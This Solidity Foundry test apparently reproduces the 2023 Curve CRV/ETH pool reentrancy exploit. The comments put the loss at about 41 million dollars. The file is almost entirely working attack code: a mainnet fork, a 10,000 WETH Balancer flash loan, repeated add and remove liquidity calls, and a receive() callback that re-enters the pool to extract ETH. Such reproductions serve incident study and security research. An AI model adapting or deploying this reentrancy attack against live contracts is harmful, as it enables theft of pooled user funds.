// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~41M USD$
// Attacker : https://etherscan.io/address/0xb752def3a1fded45d6c4b9f4a8f18e645b41b324
// Attack Contract : https://etherscan.io/address/0x83e056ba00beae4d8aa83deb326a90a4e100d0c1
// Vulnerable Contract : https://etherscan.io/address/0x8301ae4fc9c624d1d396cbdaa1ed877821d7c511
// Attack Tx : https://etherscan.io/tx/0x2e7dc8b2fb7e25fd00ed9565dcc0ad4546363171d5e00f196d48103983ae477c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x8301ae4fc9c624d1d396cbdaa1ed877821d7c511#code

// @Analysis
// Post-mortem : https://hackmd.io/@LlamaRisk/BJzSKHNjn
// Twitter Guy : https://twitter.com/vyperlang/status/1685692973051498497

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth
    ) external payable returns (uint256);

    function add_liquidity(
        uint256[2] memory amounts,
        uint256 min_mint_amount,
        bool use_eth
    ) external payable returns (uint256);

    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts, bool use_eth) external;

    function remove_liquidity_one_coin(uint256 token_amount, uint256 i, uint256 min_amount, bool use_eth) external;
}

contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 LP = IERC20(0xEd4064f376cB8d68F770FB1Ff088a3d0F3FF5c4d);
    ICurve CurvePool = ICurve(0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_807_829);
        vm.label(address(WETH), "WETH");
        vm.label(address(CRV), "CRV");
        vm.label(address(LP), "LP");
        vm.label(address(CurvePool), "CurvePool");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() external {
        deal(address(this), 0);
        CRV.approve(address(CurvePool), type(uint256).max);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(WETH.balanceOf(address(this)));

        for (uint256 i; i < 20; ++i) {
            uint256[2] memory amount;
            amount[0] = 400 ether;
            amount[1] = 0;
            CurvePool.add_liquidity{value: 400 ether}(amount, 0, true); // add liquidity

            amount[0] = 0;
            CurvePool.remove_liquidity(LP.balanceOf(address(this)), amount, true); // reentrancy enter point
            nonce++;

            CurvePool.remove_liquidity_one_coin(LP.balanceOf(address(this)), 0, 0, true); // remove liquidity to get eth
            nonce++;

            CurvePool.exchange(1, 0, CRV.balanceOf(address(this)), 0, true); // swap crv to eth
            nonce++;
        }

        WETH.deposit{value: address(this).balance}();

        WETH.transfer(address(Balancer), amounts[0] + feeAmounts[0]);
    }

    receive() external payable {
        if (msg.sender == address(CurvePool) && nonce % 3 == 0) {
            uint256[2] memory amount;
            amount[0] = 400 ether;
            amount[1] = 0;
            CurvePool.add_liquidity{value: 400 ether}(amount, 0, true);
            CurvePool.exchange{value: 500 ether}(0, 1, 500 ether, 0, true);
        }
    }
}
